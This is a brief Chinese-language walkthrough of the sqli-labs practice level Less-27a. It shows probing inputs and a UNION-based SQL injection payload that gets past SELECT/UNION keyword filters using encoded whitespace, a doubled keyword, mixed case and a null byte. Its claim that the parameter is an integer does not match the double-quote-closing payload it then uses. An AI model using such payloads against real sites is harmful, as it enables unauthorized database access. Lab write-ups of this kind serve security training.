# Less-27a **GET Trick with SELECT & UNION**
TAG：GET型注入、SELECT/UNION过滤
## 漏洞利用  
此less为less27的变种，关闭了页面的报错显示，为判断参数包裹方式带来了一定的困难  
![less27a_1](images\less27a_1.png)  

这里采用less26a中用到过的判断方法  
Payload:```?id=1```  
![less27a_2](images\less27a_2.png)  
Payload:```?id=1'```  
![less27a_3](images\less27a_3.png)  
Payload:```?id=1"```  
![less27a_4](images\less27a_4.png)  
1和1'正常回显,1"无回显，可以判断为整型   
  
构造payload方式和less27相似    
Payload:```?id=0"%0auniunionon%a0SeLEct%0a1,database(),3;%00```  
![less27a_5](images\less27a_5.png)  